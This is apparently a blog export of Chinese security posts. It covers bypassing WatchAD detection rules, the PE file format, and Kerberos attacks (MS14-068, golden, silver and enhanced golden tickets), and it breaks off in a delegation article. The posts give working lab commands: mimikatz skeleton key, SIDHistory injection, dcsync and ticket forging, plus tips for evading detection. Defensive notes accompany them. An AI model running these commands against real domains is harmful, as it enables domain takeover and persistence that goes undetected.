HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DSRMAdminLogonBehavior\n```\n\n未绕过\n\n### 绕过GPODelegation\n\n组策略委派\n\n```\nEVENT_ID = [5136]\n\ndn字段以\"cn=policies,cn=system,\"开头\n同时会根据SID判断是否为Users用户，如果不是则忽略\n```\n\n但是根据我的判断，这里的Users指的是domain users，不是OU的Users，所以不论是哪个OU的用户，SID的开头都是S-1-5-21-\n\n暂时存在几个问题，一是修改具体组策略的时候DN的内容前面是有UUID的值的：\n\n![image-20200424152751569](WatchAD.assets/image-20200424152751569.png)\n\n二是即使存在了包含CN=Policies,CN=System开头的日志也没有产生告警，代码中判断了是否为管理员权限：\n\n![image-20200424152833234](WatchAD.assets/image-20200424152833234.png)\n\n三是ObjectClass不一定全部为Container\n\n![image-20200424154502405](WatchAD.assets/image-20200424154502405.png)\n\n### 绕过GrantDelegation\n\n```\nEVENT_ID = [4738]\n\nKerberos约束委派权限授予\n该手法可用作权限维持，通过对某个用户添加高权限的委派\n\n使用_check_high_risk_spn方法对高危SPN做检测\n\"\"\"\n增加约束委派权限的高危SPN检测\n1. 包含域控主机名 可直接接管域控\n2. 服务名包含 krbtgt 变种金票\n3. 服务名包含 LDAP 可导致DCSync\n等等\n\"\"\"\n```\n\n设置主机账户的委派发现未触发4738日志，存在4742日志，凯东已经提过了\n\n### 绕过ModifySensitiveGroup\n\n```\nEVENT_ID = \n[4728\t//向启用了安全性的全局组中添加成员\n, 4732\t//\n, 4756]\n\n新增域管理员\n准确一点说，是安全组中新增加了用户\n这种情况少见，不论情况均告警，可抄送IT部门协助确认\n```\n\n将xiaom添加到domain admins组发现存在告警\n\n后来发现部分情况会产生4737事件，导致不告警，这里添加adadad到domain admins：\n\n![image-20200426140106495](WatchAD.assets/image-20200426140106495.png)\n\n![image-20200426135724315](WatchAD.assets/image-20200426135724315.png)\n\n### 绕过NewServiceInstall\n\n```\nEVENT_ID = [4697] 安装了新的服务\n\n安装新服务属于敏感事件，全部作为低危信息告警\n```\n\n```\nsc create Serv-U binpath= \"c:\\calc.exe\" start= auto displayname= \"testcalc\"\n\nsc delete Serv-U binpath=\"c:\\calc.exe\" start= auto displayname= \"testcalc\"\n```\n\n在windows server 2012是4688事件，没有看到4697事件，未产生告警\n\n![image-20200424171856238](WatchAD.assets/image-20200424171856238.png)\n\n### 绕过ScheduledTasks\n\n```\nEVENT_ID = [4698]\n\n域控的计划任务创建\n```\n\n```\nschtasks /Create /TN TestService1 /SC DAILY /ST 01:02 /TR notepad.exe\n```\n\n可以通过修改原有计划任务实现绕过，windows2012中会默认存在一个计划任务Optimize Start Menu Cache File\n\nhttp://windows.fyicenter.com/4349_Optimize_Start_Menu_Cache_Files-S-1-5-21-...-1001_Scheduled_Task_on_Windows_8.html\n\n![image-20200424183344044](WatchAD.assets/image-20200424183344044.png)\n\n建议将4072也假如检测事件中，防止对Optimize Start Menu Cache File计划任务的修改\n\n### 绕过SidHistory\n\n```\nEVENT_ID = [4765, 4766]\n\nSIDHistory 权限维持\n\n只适用于\nWindows Server 2003,\nWindows Server 2003 R2,\nWindows Server 2003 with SP1,\nWindows Server 2003 with SP2\n\n目前不考虑其它情况  出现即告警\n```\n\n利用方式：http://t3ngyu.leanote.com/post/7697c6e55644\n\n```\nprivilege::debug\nsid::query /sam:xiaom\nsid::patch\nsid::add /sam:xiaom /new:S-1-5-21-2212815815-1602272524-4203810894-500\n\n\nsid::clear /sam:xiaom\n```\n\nwindows server 2012实验产生的是5136日志：\n\n![image-20200426140943323](WatchAD.assets/image-20200426140943323.png)\n\n也会产生4738日志：\n\n![image-20200426142130737](WatchAD.assets/image-20200426142130737.png)\n\n![image-20200426142159171](WatchAD.assets/image-20200426142159171.png)\n\n### SkeletonKeys\n\n```\nEVENT_ID = [4771]\n\n万能钥匙 主动检测\n\nPreAuthType = 0 同时 Status 为 0xe\n配合 scripts/skeleton_key_scan 进行定时扫描\n```\n\nskeleton_key_scan脚本：\n\n```\n扫描每个域控，使用AES256加密发送 AS_REQ ，如果该域控被注入了万能钥匙，则会触发4771事件，错误代码为 0xe\n```\n\n```\n域控执行：\nprivilege::debug\nmisc::skeleton\n\n域内主机可以通过默认的mimikatz密码登录\nnet use \\\\dc2012\\c$ /user:\"test\\administrator\" \"mimikatz\"\n```\n\n[https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html](https://wooyun.js.org/drops/域渗透——Skeleton Key.html)\n\n主动扫描检测，但是扫描的时间在代码中没找到，未发现特别的日志\n","categories":["RedTeam&域安全"]},{"title":"PE文件结构总结及自问自答","url":"/2020/12-18-PE文件结构总结及自问自答/","content":"\n## 关于PE的自问自答\n\n### 1、PE结构从上到下的结构顺序\n\nDOS头、DOS存根、NT头（分为PE00、文件头、可选头）、节区头（多个）、节区\n\n![image-20201103172913493](PE文件结构总结及自问自答.assets/image-20201103172913493.png)\n\n### 2、如何寻找NT头的位置\n\n查看DOS头的最后四个字节指向的就是NT头的位置：\n\n<img src=\"../../../../2_技术笔记汇总/回炉重造/4二进制/逆向工程核心原理.assets/image-20201103172959876.png\" alt=\"image-20201103172959876\" style=\"zoom:33%;\" />\n\n![image-20201103173053727](PE文件结构总结及自问自答.assets/image-20201103173053727.png)\n\n小端序，所以NT头是从000000F8开始\n\n### 3、VA和RVA是什么\n\nVA是进程虚拟内存的绝对地址\n\nRVA是相对虚拟地址，是指从某个基准位置开始的相对地址（ImageBase）\n\n所以VA=ImageBase+RVA\n\n```\nImageBase的位置：NT头的可选头(IMAGE_OPTIONAL_HEADER)中\n```\n\n### 4、RAW是什么\n\nRAW指的是文件偏移（在磁盘上的偏移量），想要了解RAW，就要先了解节区头：\n\n![image-20210527144612380](PE文件结构总结及自问自答.assets/image-20210527144612380.png)\n\n这里可以看到在NT头之后就是节区头，然后再往下就是节区，节区头中说明了对应节区的内容，图中框起来的四个值的含义分别为：\n\n![image-20210527144741320](PE文件结构总结及自问自答.assets/image-20210527144741320.png)\n\n#### 例：\n\n比如，下图中notapad.exe中的`.text`节区，注意：***在PEView中查看时，相当于在内存中加载PE***\n\n![image-20210527145351635](PE文件结构总结及自问自答.assets/image-20210527145351635.png)\n\n```\n途中的红框的内容表示：\n在内存中,.text节区的起始位置的RVA为1000\n在文件中,.text节区的起始位置为400\n```\n\n.text节区在内存中：\n\n![image-20210527150041845](PE文件结构总结及自问自答.assets/image-20210527150041845.png)\n\n.text节区在文件中可以看到是从400开始：\n\n![image-20210527150111789](PE文件结构总结及自问自答.assets/image-20210527150111789.png)\n\n关于RAW的总结：\n\n```\n1、每个节区的RAW意思就是每个节区在文件中的偏移地址\n2、每个节区的节区头中的Pointer to Raw Data就是这个节区的RAW值\n3、节区在加载到内存中时,节区的起始地址会发生变化\n```\n\n### 5、RVA和RAW的转换\n\n上面一个问题可以看到在加载到内存中之后节区的位置会发生偏移，原因是：\n\n```\n在硬盘中一个数据节的大小是0x200的倍数，不足0x200的部分被0x00填充\n\n在PE文件被加载到内存中时，将按照内存数据标准存放，并以0x1000字节为基本单位进行组织，不足的也会被0x00补全\n```\n\n![image-20201103174202868](PE文件结构总结及自问自答.assets/image-20201103174202868.png)\n\n知道了一个RVA地址之后，如何计算这个地址在磁盘文件中的偏移位置：\n\n```\n\tRAW - PointtoRAWData = \t\tRVA\t - \tVirtualAddress\n文件偏移    节区的文件偏移\t   当前位置的RVA\t\t这里的VA是指节区在内存中的起始地址\n见下图：\n无论是在内存中还是在文件中，相较于节区起始位置都是一样的，所以上面公式成立，所以：\nRAW = RVA - VirtualAddress + PointtoRAWData\n```\n\n![RAW](PE文件结构总结及自问自答.assets/RAW.png)\n\n可以参考：\n\nhttp://www.loidair.com/2018/02/13/binary-basic-one/\n\nhttps://blog.csdn.net/oathevil/article/details/5786652\n\n### 6、IAT是什么\n\nImport Address Table\n\n记录程序正在使用哪些库(DLL)中的哪些函数\n\n### 7、如何在PE文件中定位IAT地址\n\nNT头从哪开始？NT头的大小为F8，也就是`PE 00`之后的F8个字节都是NT头的内容\n\n`NT头-->IMAGE_OPTIONAL_HEADER.DataDirtectory[1].VirtualAddress`就是结构体数组IID(`IMAGE_IMPORT_DESCRIPTOR`)的RVA地址\n\n![image-20201104173448604](PE文件结构总结及自问自答.assets/image-20201104173448604.png)\n\n`IMAGE_IMPORT_DESCRIPTOR`结构体的结构为：\n\n![image-20210527172811066](PE文件结构总结及自问自答.assets/image-20210527172811066.png)\n\n其中关键的信息：\n\n![image-20210527172825406](PE文件结构总结及自问自答.assets/image-20210527172825406.png)\n\n```\nINT是Import Name Table，也就是输入名称表\nName说的库名称实际上就是dll的名字，比如kernel32\nIAT的地址，也就是输入地址表，其中存储的就是函数的地址\n```\n\n找到了输入地址表，再根据这个表就可以找到想要调用的函数的地址了\n\n### 7、EAT是什么\n\nIAT大部分情况是对于EXE文件这种PE文件的，因为他们只需要使用其他的DLL的方法，不需要对外提供方法。\n\n而对于DLL来说需要对外提供方法，EAT的全称是`Export Address Table`，在文件中对应的数据结构是`IMAGE_EXPORT_DESCRIPTOR`\n\n找EAT的位置的方法和IAT差不多：\n\n`NT头-->IMAGE_OPTIONAL_HEADER.DataDirtectory[1].VirtualAddress`中存储了结构体数组IID(`IMAGE_IMPORT_DESCRIPTOR`)的RVA地址\n\n`NT头-->IMAGE_OPTIONAL_HEADER.DataDirtectory[0].VirtualAddress`中存储了结构体数组`IMAGE_EXPORT_DESCRIPTOR`的RVA地址，结构体和含义如下：\n\n![image-20210528113018671](PE文件结构总结及自问自答.assets/image-20210528113018671.png)\n\n其中AddressOfFunctions就是DLL中对外提供的函数的地址。\n\n### 8、计算最先执行的代码位置\n\n通过NT头的可选头(IMAGE_OPTIONAL_HEADER)中的AddressOfEntryPoint来寻找\n这里的AddressOfEntryPoint也是RVA地址，所以想要换算成RAW地址，要像上面的公式一样来进行换算\n\n![image-20201104173354946](PE文件结构总结及自问自答.assets/image-20201104173354946.png)\n\n加一个ollydbg的图\n\n## 导图\n\n主要为了展现在寻找IAT时从PVA地址到RAW地址的转换方法。因为是xmind导出的，所以放大之后不是很清晰，可以下载svg格式的：\n\n![image-20201104173117757](PE文件结构总结及自问自答.assets/PE.png)\n\n","categories":["二进制相关"]},{"title":"Kerberos协议探索系列二票据篇","url":"/2020/12-18-Kerberos协议探索系列二票据篇/","content":"\nFreebuf链接：https://www.freebuf.com/articles/system/197160.html\n\n# 0x00 前言\n\n在上一篇中说明了Kerberos的原理以及SPN的扫描和Kerberoasting的攻击方式，本章具体说一下Kerberos曾经爆出的一个经典的漏洞MS14068和金银票据的原理和利用方式。MS14068是一个比较经典的漏洞，曾经也有同学在平台上说明过，本文炒一次冷饭并且对增强型的金票据做一个说明。\n\n# 0x01 MS14068\n\nMS14068是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。首先我们来说一下利用方式。\n\n## 1 利用方式\n\n实验环境：\n\n```\n域：YUNYING.LAB\n域控：Windows Server 2008 R2 x64(DC)\n域内主机：Windows 7 x64(s1):域帐户ts1\n所需工具：\nPykek\nmimikatz\n```\n\n攻击流程：\n\n实验之前需要在域控主机查看是否安装了KB3011780补丁，可通过systeminfo来查看。\n\n一、首先在域内主机s1上通过dir来访问域控的共享文件夹，示拒绝访问。\n\n![1575790834232](Kerberos协议探索系列二票据篇.assets/1575790834232.png)\n\n二、通过Pykek工具利用漏洞，我这里使用的是将python脚本编译之后的exe文件。\n\n参数说明：\n\n```\n-u 域账号+@+域名称，这里是ts1+@+yunying.lab\n-p 为当前用户的密码，即ts1的密码\n-s为ts1的SID值，可以通过whoami /all来获取用户的SID值\n-d为当前域的域控\n```\n\n![1575790850579](Kerberos协议探索系列二票据篇.assets/1575790850579.png)\n\n脚本执行成功会在当前目录下生成一个ccache文件。\n\n![1575790859781](Kerberos协议探索系列二票据篇.assets/1575790859781.png)\n\n三、使用mimikatz导入生成的ccache文件，导入之前cmd下使用命令klist purge或者在mimikatz中使用kerberos::purge删除当前缓存的kerberos票据。\n\n![1575790892397](Kerberos协议探索系列二票据篇.assets/1575790892397.png)\n\n再次dir访问域控共享已经可以成功访问。\n\n![1575790902960](Kerberos协议探索系列二票据篇.assets/1575790902960.png)\n\n## 2 漏洞原理\n\nMS14068工具在使用过程中抓包可以看到s1和域控192.168.254.130（实质上是与安装在域控上的KDC）有KRB_AS_REQ、KRB_AS_REP、KRB_TGS_REQ、KRB_TGS_REP四次交互。\n\n![1575790909506](Kerberos协议探索系列二票据篇.assets/1575790909506.png)\n\n下面根据流程和工具源码来看漏洞是如何利用的：\n\n### KRB_AS_REQ\n\n首先程序通过build_as_req函数构建AS_REQ，在这里可以看到，参数pac_request设置为false。\n\n![1575790919863](Kerberos协议探索系列二票据篇.assets/1575790919863.png)\n\n也就是说设置了这个参数之后会向KDC申请一张不包含PAC的TGT票据，这是微软默认的设计，在下列链接中有详细说明。\n\nhttps://docs.microsoft.com/en-us/previous-versions/aa302203(v=msdn.10)#security-considerations\n\n![1575790930929](Kerberos协议探索系列二票据篇.assets/1575790930929.png)\n\n通过PCAP包可以更直观的看到在AS-REQ请求中的include-pac:False字段。这是造成这个漏洞的第一个因素。\n\n![1575790938342](Kerberos协议探索系列二票据篇.assets/1575790938342.png)\n\n### KRB_AS_REP\n\n在AS发起请求之后，KDC（AS）将返回一张不包含有PAC的TGT票据给Client。在这里是tgt_a。\n\n![1575790943196](Kerberos协议探索系列二票据篇.assets/1575790943196.png)\n\n抓包可以看到这个以268fdb开头的TGT票据。\n\n![1575790949830](Kerberos协议探索系列二票据篇.assets/1575790949830.png)\n\n### KRB_TGS_REQ\n\n攻击脚本使用了两个关键函数来实现这个过程，首先通过build构造PAC，然后通过build_tgs_req函数构造TGS-REQ的内容。\n\n![1575790956188](Kerberos协议探索系列二票据篇.assets/1575790956188.png)\n\n#### build_pac\n\n当Client接收到AS返回的不带有PAC的TGT之后通过脚本中的build_pac函数开始构造PAC。\n\n![1575790962750](Kerberos协议探索系列二票据篇.assets/1575790962750.png)\n\n这里我们重点关注一下PAC中的chksum1和chksum2，也就是“PAC的引入”中提到的PAC的两个数字签名PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM。\n\n注意一下其中第一个参数server_key[0]和kdc_key[0]的值其实是程序指定的RSA_MD5，而Key的值为None，但原则上来说这个加密方式是应该由KDC来确定的。也就是说加密PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM这两个数字签名的Key应该分别是Server密码HASH和KDC密码HASH，在这里却直接使Key为None，然后直接使用RSA_MD5方式加密。\n\n这是漏洞形成的第二个因素，查看checksum函数即可验证这一点。\n\n![1575790971624](Kerberos协议探索系列二票据篇.assets/1575790971624.png)\n\n同时在这个过程中我们也需要关注一下user_sid这个参数，build_pac函数会将其分割，然后重新构造高权限的sid的值。在这里user_sid的值为S-1-5-21-4249968736-1423802980-663233003-1104，分割之后domain_sid为S-1-5-21-4249968736-1423802980-663233003，user_id为1104。\n\n![1575790979824](Kerberos协议探索系列二票据篇.assets/1575790979824.png)\n\n其中512、520、518、519分别为不同的组的sid号。513为DOMAIN USERS组。通过这种方式构造了包含高权限组SID的PAC。\n\n![1575790986788](Kerberos协议探索系列二票据篇.assets/1575790986788.png)\n\n#### build_tgs_req\n\n在build_tgs_req函数的参数中，authorization_data对应的为build_pac生成的pac。\n\n![1575790992562](Kerberos协议探索系列二票据篇.assets/1575790992562.png)\n\n这里将PAC传入build_tgs_req之后使用subkey将其加密。\n\n![1575790998246](Kerberos协议探索系列二票据篇.assets/1575790998246.png)\n\n而通过下图可以看到subkey其实是函数generate_subkey生成的一串16位的随机数。\n\n![1575791006188](Kerberos协议探索系列二票据篇.assets/1575791006188.png)\n\n![1575791015789](Kerberos协议探索系列二票据篇.assets/1575791015789.png)\n\n那现在为止出现的问题有：\n\n```\nA、在域中默认允许设置Include-pac的值为False（不能算漏洞，应该是微软对于某些特定场景的特殊考虑设计出的机制）。\nB、PAC中的数字签名可以由Client端指定，并且Key的值可以为空。\nC、PAC的加密方式也可以由Client指定，并且Key的值为generate_subkey函数生成的16位随机数。\nD、构造的PAC中包含高权限组的SID内容。\n```\n\n也就是说通过这几点Client完全伪造了一个PAC发送给KDC，并且KDC通过Client端在请求中指定的加密算法来解密伪造的PAC以及校验数字签名，并验证通过。通过抓包可以看到在这个过程中将接收的TGT（268fdb开头）和加密方式为ARCFOUR-HMAC-MD5的PAC内容。\n\n![1575791041899](Kerberos协议探索系列二票据篇.assets/1575791041899.png)\n\n### KRB_TGS_REP\n\nKDC在根据对伪造的PAC验证成功之后，返回给Client端一有新的TGT，并且这个TGT会将Pykek生成的PAC包含在其中，这里正常情况下返回的其实是一张用于发送给Server端做认证的ST票据。\n\n![1575791048480](Kerberos协议探索系列二票据篇.assets/1575791048480.png)\n\n当Pykek工具接收到新的TGT之后就将其保存生成ccache文件。也就是说这时Client已经获得了一张包含有高权限PAC内容的正常的TGT票据（564eab开头）。\n\n![1575791056012](Kerberos协议探索系列二票据篇.assets/1575791056012.png)\n\n### 使用Mimikatz利用TGT访问DC共享文件夹\n\n这时我们通过mimikatz来导入票证，并且用dir \\\\dc.yunying.lab\\c$来访问域控的共享文件夹。\n\n![1575791061476](Kerberos协议探索系列二票据篇.assets/1575791061476.png)\n\n抓包可以看到这时Client端发起了两次TGS-REQ请求，重点关注一下第一次，此时用的票据就是使用mimikatz导入的TGT，也就是上面KRB_TGS_REP过程中返回的那个tgt_b（564eab开头）。\n\n![1575791067132](Kerberos协议探索系列二票据篇.assets/1575791067132.png)\n\n请求之后返回了一张针对dc.yunying.lab（域控）的CIFS票据也就是正常流程中的ST（Service Ticket）票据（234062开头）：\n\n![1575791071336](Kerberos协议探索系列二票据篇.assets/1575791071336.png)\n\n这时在抓的包中发现并没有AP_REQ这个流程，是因为在Kerberos中AP_REQ这个过程放在了服务的第一次请求中，这里是放在SMB的Session Setup Request中（其他协议同理，比如HTTP协议是放在GET请求中）。\n\n![1575791077089](Kerberos协议探索系列二票据篇.assets/1575791077089.png)\n\n然后在SMB的Session Setup Response中做出响应，也就是AP-REP这个流程。\n\n![1575791081317](Kerberos协议探索系列二票据篇.assets/1575791081317.png)\n\n到此为止Client能够越权访问域控的共享文件夹。\n\n## 3 防御与检测\n\n此漏洞是一个14年的漏洞，多数产生在windows server 2008和windows server 2003的域环境中，所以安全补丁早已可以下载安装，用户可以通过在域控上安装KB3011780补丁来规避风险。\n\n同时可以根据上文中提到的标记include-pac为False的特征来初步的筛选。\n\n![1575791086872](Kerberos协议探索系列二票据篇.assets/1575791086872.png)\n\n也可以通过windows日志来发现，如ID为4624登录到目标服务器、ID为5140表示网络共享对象被访问等等。\n\n![1575791091307](Kerberos协议探索系列二票据篇.assets/1575791091307.png)\n\n在这个漏洞中主要的问题是存在于KDC会根据客户端指定PAC中数字签名的加密算法，以及PAC的加密算法，来校验PAC的合法性。这使得攻击者可通过伪造PAC，修改PAC中的SID，导致KDC判断攻击者为高权限用户，从而导致权限提升漏洞的产生。\n\n# 0x02 Golden Ticket\n\n**简介**\n\nGolden Ticket（下面称为金票）是通过伪造的TGT（Ticket Granting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。\n\n**制作金票的条件：**\n\n```\n1、域名称 \n2、域的SID值 \n3、域的KRBTGT账户密码HASH\n4、伪造用户名，可以是任意的\n```\n\n**实验环境**\n\n```\n域：YUNYING.LAB\n域控：Windows Server 2008 R2 x64(DC)\n域内主机：Windows 7 x64(s1):用户ts1\n```\n\n**所需工具**\n\n​         Mimikatz\n\n**实验流程**\n\n金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的\n\nlsadump::dcsync /domain:yunying.lab /user:krbtgt命令获取krbtgt的值。如果已经通过其他方式获取到了KRBTGT HASH也可以直接进行下一步。\n\n![1575791118360](Kerberos协议探索系列二票据篇.assets/1575791118360.png)\n\n得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。\n\n参数说明：\n\n```\n/admin：伪造的用户名\n/domain：域名称\n/sid：SID值，注意是去掉最后一个-后面的值\n/krbtgt：krbtgt的HASH值\n/ticket：生成的票据名称\n```\n\n![1575791140670](Kerberos协议探索系列二票据篇.assets/1575791140670.png)\n\n金票的使用\n\n通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。\n\n![1575791145823](Kerberos协议探索系列二票据篇.assets/1575791145823.png)\n\n已经可以通过dir成功访问域控的共享文件夹。\n\n![1575791151638](Kerberos协议探索系列二票据篇.assets/1575791151638.png)\n\n这样的方式导入的票据20分钟之内生效，如果过期再次导入就可以，并且可以伪造任意用户。\n\n# 0x03 Silver Tickets\n\n**简介**\n\nSilver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。\n\n**制作银票的条件：**\n\n```\n1.域名称 \n2.域的SID值 \n3.域的服务账户的密码HASH（不是krbtgt，是域控）\n4.伪造的用户名，可以是任意用户名，这里是silver\n```\n\n**实验环境**\n\n```\n域：YUNYING.LAB\n域控：Windows Server 2008 R2 x64(DC)\n域内主机：Windows 7 x64(s1):用户ts1\n```\n\n**所需工具**\n\n​         Mimikatz\n\n**实验流程**\n\n首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是DC$的HASH。\n\n![1575791253797](Kerberos协议探索系列二票据篇.assets/1575791253797.png)\n\n![1575791257722](Kerberos协议探索系列二票据篇.assets/1575791257722.png)\n\n这时得到了DC的HASH值，通过mimikatz生成银票。\n\n参数说明：\n\n```\n/domain：当前域名称\n/sid：SID值，和金票一样取前面一部分\n/target：目标主机，这里是dc.yunying.lab\n/service：服务名称，这里需要访问共享文件，所以是cifs\n/rc4：目标主机的HASH值\n/user：伪造的用户名\n/ptt：表示的是Pass The Ticket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入\n```\n\n![1575791283382](Kerberos协议探索系列二票据篇.assets/1575791283382.png)\n\n这时通过klist查看本机的kerberos票据可以看到生成的票据。\n\n![1575791288724](Kerberos协议探索系列二票据篇.assets/1575791288724.png)\n\n使用dir \\\\dc.yunying.lab\\c$访问DC的共享文件夹。\n\n![1575791292461](Kerberos协议探索系列二票据篇.assets/1575791292461.png)\n\n银票生成时没有KRBTGT的密码，所以不能伪造TGT票据，只能伪造由Server端密码加密的ST票据，只能访问指定的服务。\n\n# 0x04 Enhanced Golden Tickets\n\n在Golden Ticket部分说明可利用krbtgt的密码HASH值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。但是普通的金票不能够跨域使用，也就是说金票的权限被限制在当前域内。\n\n## 1普通金票的局限性\n\n为什么普通金票会被限制只能在当前域内使用？\n\n在上一篇文章中说到了域树和域林的概念，同时说到YUNYING.LAB为其他两个域（NEWS.YUNYING.LAB和DEV.YUNYING.LAB）的根域，根域和其他域的最大的区别就是根域对整个域林都有控制权。而域正是根据Enterprise Admins组（下文会说明）来实现这样的权限划分。\n\n![1575791300987](Kerberos协议探索系列二票据篇.assets/1575791300987.png)\n\n## 2 实验演示\n\n**实验环境**\n\n```\n根域：YUNYING.LAB\n域控：DC.YUNYING.LAB\n\n子域：NEWS.YUNYING.LAB\n域控：NEWSDC.NEWS.YUNYING.LAB\n\n子域：DEV.YUNYING.LAB\n域控：DEVDC.DEV.YUNYING.LAB\n\n操作系统均为Windows Server 2008 R2 x64\n```\n\n**使用工具：**\n\n​         Mimikatz\n\n**实验流程：**\n\n首先使用mimikatz在NEWSDC（NEWS.YUNYING.LAB的域控）上生成普通的金票，真实环境会是在域内的主机中，这里方便演示所以在域控中，原理和结果是一样的。\n\n```\nKerberos::golden /admin:administrator /domain:news.yunying.lab /sid:SID /krbtgt:XXXXX /ptt\n```\n\n![1575791353792](Kerberos协议探索系列二票据篇.assets/1575791353792.png)\n\n这里使用的是NEWS.YUNYING.LAB域的SID号，访问根域的DC共享文件夹被拒绝。\n\n![1575791363212](Kerberos协议探索系列二票据篇.assets/1575791363212.png)\n\n下面说明下具体原因。\n\n### Enterprise Admins组\n\nEnterprise Admins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是YUNYING.LAB中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。\n\n![1575791369462](Kerberos协议探索系列二票据篇.assets/1575791369462.png)\n\n通过whoami命令在yunying.lab的域控上可以看到Enterprise Admins组的RID为519（最后三位）\n\n![1575791375830](Kerberos协议探索系列二票据篇.assets/1575791375830.png)\n\n### Domain Admins组\n\n可以看到在子域中是不存在Enterprise Admins组的，在一个子域中权限最高的组就是Domain Admins组。截图是news.yunying.lab这个子域中的Administrator用户，这个Administrator有当前域的最高权限。\n\n![1575791426283](Kerberos协议探索系列二票据篇.assets/1575791426283.png)\n\n通过whoami命令也可以看到在news.yunying.lab这个子域中没有Enterprise Admins组的SID号。\n\n![1575791450706](Kerberos协议探索系列二票据篇.assets/1575791450706.png)\n\n在子域中使用mimikatz创建的黄金票据不能跨域使用的原因也就在这里，通过whoami可以看到YUNYING.LAB中Enterprise Admins组的SID号是：\n\n```\nS-1-5-21-4249968736-1423802980-663233003-519\n```\n\n而NEWS.YUNYING.LAB域中的SID号是：\n\n```\nS-1-5-21-3641416521-285861825-2863956705-XXX\n```\n\nmimikatz通过/sid选项接收SID号然后在尾部拼接RID号（512,519等），拼接之后生成的Enterprise Admins组的完整SID是：\n\n```\nS-1-5-21-3641416521-285861825-2863956705-519\n```\n\n而这个SID在整个域林中都是不存在的，所以在子域中通过mimikatz生成的金票无法跨域或者是访问其他域的资源。在一个域林中，域控权限不是终点，根域的域控权限才是域渗透的终点。\n\n## 3 突破限制\n\n普通的黄金票据被限制在当前域内，在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。这里没有迁移，直接拿根域的SID号做演示。\n\n![1575791470523](Kerberos协议探索系列二票据篇.assets/1575791470523.png)\n\n如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 Enterprise Admins组权限（域林中的最高权限）的票据。环境与上文普通金票的生成相同。\n\n首先我们通过klist purge删除当前会话的Kerberos票据，也可以在mimikatz里通过kerberos::purge来删除。\n\n![1575791477562](Kerberos协议探索系列二票据篇.assets/1575791477562.png)\n\n然后通过mimikatz重新生成包含根域SID的新的金票\n\n```\nKerberos::golden /admin:administrator /domain:news.yunying.lab /sid:XXX /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt\n```\n\n![1575791488437](Kerberos协议探索系列二票据篇.assets/1575791488437.png)\n\nStartoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间\n\n注意这里是不知道根域YUNYING.LAB的krbtgt的密码HASH的，使用的是子域NEWS.YUNYING.LAB中的KRBTGT的密码HASH。\n\n然后再通过dir访问DC. YUNYING.LAB的共享文件夹，发现已经可以成功访问。\n\n![1575791498146](Kerberos协议探索系列二票据篇.assets/1575791498146.png)\n\n此时的这个票据票是拥有整个域林的控制权的。我们知道制作增强金票的条件是通过SIDHistory那防御方法就是在域内主机迁移时进行SIDHistory过滤，它会擦除SIDHistory属性中的内容。\n\n# 0x05小结\n\n​         本文主要说明了MS14068的利用方式和金银票据，主要用来提升和维持域内权限，通常情况下需要结合其他的域内攻击方式进行使用，比如获取了域控制器的NTLM HASH等内容时。下一文将介绍关于Kerberos委派相关的攻击手法和实现原理。\n\n# 实验工具\n\nhttps://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20181209\n\nhttps://github.com/abatchy17/WindowsExploits/tree/master/MS14-068\n\n# 参考链接\n\nhttps://adsecurity.org/?p=1640\n\nhttps://adsecurity.org/?p=2011\n\nhttps://www.cnblogs.com/backlion/p/8127868.html\n\nhttps://blogs.msdn.microsoft.com/openspecification/2009/04/24/understanding-microsoft-kerberos-pac-validation/\n\n ","categories":["RedTeam&域安全"]},{"title":"Kerberos协议探索系列三委派篇","url":"/2020/12-18-Kerberos协议探索系列三委派篇/","content":"\nFreebuf链接：https://www.freebuf.com/articles/system/198381.html\n\n# 0x00前言\n\n在前两节中说到了关于Kerberos的扫描和Kerberoasting以及金票的利用，本文主要说明一下在kerberos体系中关于委派的利用方式，委派在域环境中其实是一个很常见的功能，对于委派的利用相较于先前说的几种攻击方式较为“被动”，但是一旦利用也会有很大的危害。\n\n# 0x01什么是委派\n\n在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派。\n\n例：\n\n![1575808728012](Kerberos协议探索系列三委派篇.assets/1575808728012.png)\n\n​         User访问主机s2上的HTTP服务，而HTTP服务需要请求其他主机的SQLServer数据库，但是S2并不知道User是否有权限访问SQLServer，这时HTTP服务会利用User的身份去访问SQLServer，如果User有权限访问SQLServer服务才能访问成功。\n\n​         而委派主要分为非约束委派（Unconstrained delegation）和约束委派（Constrained delegation）两个方式，下面分别介绍两种方式如何实现。\n\n## 1 非约束委派\n\n非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。\n\n![1575808740173](Kerberos协议探索系列三委派篇.assets/1575808740173.png)\n\n**流程：**\n\n```\n1.用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable 